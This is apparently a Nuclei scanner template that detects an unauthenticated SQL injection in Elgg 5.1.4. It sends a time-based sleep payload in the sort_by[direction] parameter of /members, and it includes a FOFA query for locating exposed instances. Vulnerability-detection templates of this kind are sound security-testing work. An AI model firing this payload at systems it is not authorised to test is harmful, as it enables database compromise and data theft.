flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"elgg.js")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - duration >= 6
    - contains(body,"All members")
    - status_code == 200
    type: dsl
  raw:
  - '@timeout 20s

    GET /members?sort_by%5Bproperty%5D=name&sort_by%5Bproperty_type%5D=metadata&sort_by%5Bdirection%5D=desc%2c(select*from(select(sleep(6)))a)
    HTTP/1.1

    Host: {{Hostname}}

    '
id: elgg-sqli
info:
  author: s4e-io
  description: 'Elgg 5.1.4 version has a SQL Injection vulnerability in the sort_by[direction]
    parameter. This vulnerability allows an unauthenticated attacker to manipulate
    SQL queries by injecting malicious SQL code, potentially leading to unauthorized
    data access or database compromise. No user authentication is required to exploit
    this vulnerability.

    '
  metadata:
    fofa-query: icon_hash="413602919"
    max-request: 1
    product: elgg
    vendor: elgg
    verified: true
  name: Elgg 5.1.4 - SQL Injection
  reference:
  - https://github.com/4rdr/proofs/blob/main/info/Elgg_unauth_SQLi_5.1.4.md
  - https://github.com/Elgg/Elgg
  severity: high
  tags: elgg,sqli,vuln
